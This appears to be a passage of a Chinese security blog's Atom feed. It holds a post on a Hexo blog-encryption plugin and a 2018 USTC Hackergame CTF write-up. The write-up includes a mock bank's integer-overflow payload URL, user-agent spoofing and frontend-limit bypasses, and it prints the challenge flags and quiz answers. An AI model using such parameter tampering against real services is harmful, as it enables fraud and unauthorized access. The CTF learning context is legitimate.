J/jrA==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
    
      <category term="学一门语言" scheme="http://bobosec.top/tags/%E5%AD%A6%E4%B8%80%E9%97%A8%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>Blog Encrypt</title>
    <link href="http://bobosec.top/2018/10/17/Blog-Encrypt/"/>
    <id>http://bobosec.top/2018/10/17/Blog-Encrypt/</id>
    <published>2018-10-17T03:13:12.000Z</published>
    <updated>2018-10-17T03:24:16.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天看到关于博客加密，想试一下，因为有时候我们写的很多东西不是想对外开放的，之前hexo加密，通过查看源代码直接能看到密码，这次这个在github上面这个小插件还是不错的。<br>想看Github具体介绍的<a href="https://github.com/MikeCoder/hexo-blog-encrypt" target="_blank" rel="noopener">点击这里</a></p><h2 id="正题开始：安装"><a href="#正题开始：安装" class="headerlink" title="正题开始：安装"></a>正题开始：安装</h2><p><code>npm install --save hexo-blog-encrypt</code><br>或者<br><code>yarn add hexo-blog-encrypt</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在<code>_config.yml</code>下面的插件中启用插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Security</span><br><span class="line">##</span><br><span class="line">encrypt:</span><br><span class="line">    enable: true</span><br></pre></td></tr></table></figure><br>然后将密码和显示的信息写在文章开头，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: mikemessi</span><br><span class="line">abstract: Welcome to my blog, enter password to read.</span><br><span class="line">message: Welcome to my blog, enter password to read.</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><ol><li>password是博客密码。</li><li>abstract是将在博客列表页面中显示的内容。</li><li>message是将在博客详细信息页面中显示的内容。<br>这样就ok了</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前几天看到关于博客加密，想试一下，因为有时候我们写的很多东西不是想对外开放的，之前hexo加密，通过查看源代码直接能看到密码，这次这个在gi
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018中科大CTF</title>
    <link href="http://bobosec.top/2018/10/09/2018%E4%B8%AD%E7%A7%91%E5%A4%A7CTF/"/>
    <id>http://bobosec.top/2018/10/09/2018中科大CTF/</id>
    <published>2018-10-09T10:51:37.000Z</published>
    <updated>2018-10-10T01:29:44.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="题目如下"><a href="#题目如下" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/签到1.jpg" alt=" "><br>key输入框有最长输入限制，从前端改一下就好，如图<br><img src="/2018/10/09/2018中科大CTF/签到2.jpg" alt=" "><br><code>flag{Hackergame2018_Have_Fun!}</code></p><h1 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h1><h2 id="题目如下-1"><a href="#题目如下-1" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/游园1.jpg" alt=" "><br>这个题真的想吐槽一波。。。一直以为有什么规律，结果就是拼图，而且还不是很好拼(可能我太菜了)<br>最后终于得出了flag<br><code>flag{H4PPY_1M4GE_PR0CE551NG}</code></p><h1 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h1><h2 id="题目如下-2"><a href="#题目如下-2" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/word1.jpg" alt=" "><br>下载下来是个word文档，但是有损坏，winhex查看发现有flag.txt<br><img src="/2018/10/09/2018中科大CTF/word2.jpg" alt=" "><br>然后在linux用binwalk提取出来，发现了flag.txt得到flag。<br><code>flag{xlsx,pptx,docx_are_just_zip_files}</code><br>后来根据flag提示，发现刚开始那个附件，改一下后缀，改为zip，解压就可以得到flag.txt</p><h1 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h1><h2 id="题目如下-3"><a href="#题目如下-3" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/石头1.jpg" alt=" "><br>打开链接看到<br><img src="/2018/10/09/2018中科大CTF/石头2.jpg" alt=" "><br>于是我们就找一下黑曜石浏览器，百度貌似找不到这个东西，用必应浏览器可以找到<br><a href="https://heicore.com/" target="_blank" rel="noopener">黑曜石</a><br>我们在这个页面查看源码，不过右键查看被禁了<br>我们直接输入<code>view-source:https://heicore.com/index.html</code>可以看到源码<br><img src="/2018/10/09/2018中科大CTF/石头3.jpg" alt=" "><br>看到这里，想到替换user-agent为<code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36</code><br>重新访问刚才页面，得到flag。<br><code>flag{H3ic0re_49.1.2623.213_sai_kou}</code></p><h1 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h1><h2 id="第一个题目如下"><a href="#第一个题目如下" class="headerlink" title="第一个题目如下"></a>第一个题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/我是谁1.jpg" alt=" "><br>打开看到<br><img src="/2018/10/09/2018中科大CTF/我是谁2.jpg" alt=" "><br>一头雾水，然后试试注入等等，都没用。。。<br>后来想看一下请求头，发现是418请求头，很奇怪的请求头，于是百度发现：</p><ul><li>HTCPCP 1.0 RFC2324<blockquote><p>超文本咖啡壶控制协议（英文：Hyper Text Coffee Pot ControlProtocol，HTCPCP）是一种用于控制、监测和诊断咖啡壶的协议。<br>这个协议在文档RFC 2324[1]（发布于1998年4月1日）中被定义。尽管互联网国际标准机构经常在4月1日发布一些恶搞之作，他们还是让这个协议看上去像是一个真的、非虚构的协议（比如HTTP）。文本编辑器Emacs甚至完全兼容于这个协议，Mozilla也发布了数个补丁来扩展旗下产品的功能。<br>HTCPCP是HTTP协议的扩展HTCPCP请求通过URI架构coffee:来引用，并且还包含了若干种HTTP请求</p></blockquote></li></ul><ol><li>BREW或POST：令HTCPCP服务器（咖啡壶）煮咖啡。</li><li>GET：从服务器获取咖啡。</li><li>PROPFIND：获取咖啡的元数据。</li><li>WHEN：让服务器停止向咖啡中加入牛奶（如适用）。<br>这个协议还定义了两种错误答复：</li><li>406 Not Acceptable（不能接受的）：HTCPCP服务器由于某种原因而暂时不能煮咖啡。服务器在回复中应当包含一组可接受的咖啡类型列表。</li><li>I’m a teapot（我是茶壶）：HTCPCP服务器是一个茶壶。给出答复的实体可能是又矮又胖的。<br>所以输入<code>I&#39;m a teapot</code>得到flag<br><code>flag{i_canN0t_BReW_c0ffEE!}</code></li></ol><h1 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h1><h2 id="题目如下-4"><a href="#题目如下-4" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/bank1.jpg" alt=" "><br>打开链接：<br><img src="/2018/10/09/2018中科大CTF/bank2.jpg" alt=" "><br>先开始以为是web……后来做好怀疑人生又以为是数学题，后来抓包发现如果时间参数过大可以溢出<br>于是我们先兑换理财产品需要的货币：TDSU<br>然后我们存入，但是时间参数需要修改为一个很大的数<br>payload：<code>http://202.38.95.46:12003/?action=buy_A1&amp;period=5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555&amp;val=39636</code><br>后面的val是存入的钱数，填写自己兑换好的货币总量就ok。<br>于是我们看到<br><img src="/2018/10/09/2018中科大CTF/bank3.jpg" alt=" "><br>我们点击取出，然后发现自己成了土豪，再慢慢兑换买flag需要的货币就ok<br><code>flag{Evil_Integer._Evil_Overflow.}</code></p><h1 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h1><h2 id="题目如下-5"><a href="#题目如下-5" class="headerlink" title="题目如下"></a>题目如下</h2><p><img src="/2018/10/09/2018中科大CTF/问答1.jpg" alt=" "><br><img src="/2018/10/09/2018中科大CTF/问答2.jpg" alt=" "><br>讲真的这个还是有点难哈哈哈,也默默佩服中科大~<br>贴上答案：<br>1958<br>9111B026<br>9<br>TP311.1/94<br>3A202<br><code>flag{G00G1E-is-always-YOUR-FRIEND}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;h2 id=&quot;题目如下&quot;&gt;&lt;a href=&quot;#题目如下&quot; class=&quot;headerlink&quot; title=&quot;题目如下&quot;&gt;&lt;/a&gt;题目如下&lt;/h
      
    
    </summary>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
</feed>
